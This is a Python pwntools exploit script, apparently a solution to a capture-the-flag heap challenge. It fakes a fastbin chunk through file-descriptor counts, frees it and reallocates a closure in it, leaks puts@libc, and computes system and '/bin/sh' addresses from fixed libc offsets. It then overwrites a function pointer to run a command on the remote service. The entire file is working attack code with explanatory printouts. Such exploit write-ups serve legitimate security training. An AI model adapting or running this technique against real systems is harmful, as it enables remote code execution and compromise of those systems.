#!/usr/bin/python3

#import libraries
import sys
#get some pwn stuff into global namespace
from pwn import p64, p32, p16, p8, sleep, remote, context
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
context.log_level = 'error'

#set host and port to connect to
host = "hacky3"
port = 13720
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])


flag_prev_in_use = 0x1
max_open_fd = 2 #in the beginning stdin, stdout and stderr are open


#This is where the exploit lives.
def exploit():

    proc = remote(host, port, fam="ipv4")

    proc.readuntil(b"Polish vodka\x1b[0m!\n");

    #set size for fake chunk
    print("(-) Opening multiple files to set file descriptor on stack to 0x21.")
    print("    This works deterministically since filedescriptors are assigned in order (3,4,5,...).")
    print("    In memory fd is adjacent to buf and will be used as our fake chunk's size field.")
    print("    We hence create a (fastbin) chunk of size 0x20 with the prev_in_use flag set.")
    proc.write( ((0x20|flag_prev_in_use)-max_open_fd) * b"r /dev/zero\n" )

    #set next size for fake chunk to valid value
    print("(-) Writing buf to set size field of next fake chunk after fake.")
    print("    For this we override the first 3*8 bytes arbitrarily followed by 0x21 (valid fastbin chunk size).")
    proc.write(b"e\n") 
    proc.write(0x18*b"\x00" + p64(0x20 | flag_prev_in_use) + b"\n")

    print("(-) Calling free() on the fake chunk to insert it into the 0x20 fastbin.")
    proc.write(b"f\n")

    print("(-) Allocating new instance of 'struct closure* call' in fake chunk.")
    print("    call->f will be initialized with puts@libc.")
    proc.write(b"m\n")

    #just read from a file that yiels no input to use printf for puts leak
    print("(-) Leaking address of puts@libc from fake chunk.")
    print("    For this we cannot use call->f, as the program will exit after calling it.")
    print("    Read from a file that yields no input instead (/dev/null) to leave buf unchanged.")
    print("    This allows us to leak puts@libc using printf, as the fake chunk is located in buf.")
    proc.write(b"r /dev/null\n")
    proc.readuntil(b"\x90")
    addr_libc_puts_leak = proc.readline()
    if len(addr_libc_puts_leak) != 6:
        print("(-) Something went wrong extracting the address of puts@libc. Maybe there's NULL or '\n' in the address.")
        proc.close()
        return
    addr_libc_puts = int.from_bytes(b"\x90" + addr_libc_puts_leak[0:5], 'little')
    print(f"(-) Successfully leaked address of puts@libc: {addr_libc_puts:#0{0}18x}")

    addr_libc_base = addr_libc_puts - 0x68f90
    addr_libc_system = addr_libc_base + 0x3f480
    addr_libc_string_bin_sh = addr_libc_base + 0x161c19
    print(f"(-) Calculated addresses: {{libc:{addr_libc_base:#0{0}18x}, system@libc:{addr_libc_system:#0{0}18x}, '/bin/sh'@libc.rodata:{addr_libc_string_bin_sh:#0{0}18x}}}")

    if b'\n' in p64(addr_libc_system) or b'\n' in p64(addr_libc_string_bin_sh):
        print("(-) Address contains newline. Cannot write address with fgets...")
        proc.close()
        return

    print("(-) Replacing address puts@libc in fake chunk with system@libc and '/bin/sh'@libc.rodata.")
    print("    We can do this, since the fake chunk is located in buf, which we can write to.")
    proc.write(b"e\n")
    proc.write(p64(addr_libc_system) + p64(addr_libc_string_bin_sh) + b"\n")


    print("(-) Initiating call to function at address in fake chunk: system(\"/bin/get_flag\").")
    proc.write(b"x\n")

    print("(-) Trying to obtain flag.")
    for i in range(0,30):
        proc.write(b"/bin/get_flag\n")
        flag = proc.readline(timeout=0.3)
        if b'flag' in flag:
            print(f"(-) Successfully retrieved flag: {flag.decode()}")
            break
        else:
            print("(-) Waiting for flag...")
    if not b'flag' in flag:
        print("(-) Something went wrong retrieving the flag.")

    proc.close()
    return

#Invoke the exploit when the script is executed.
exploit()


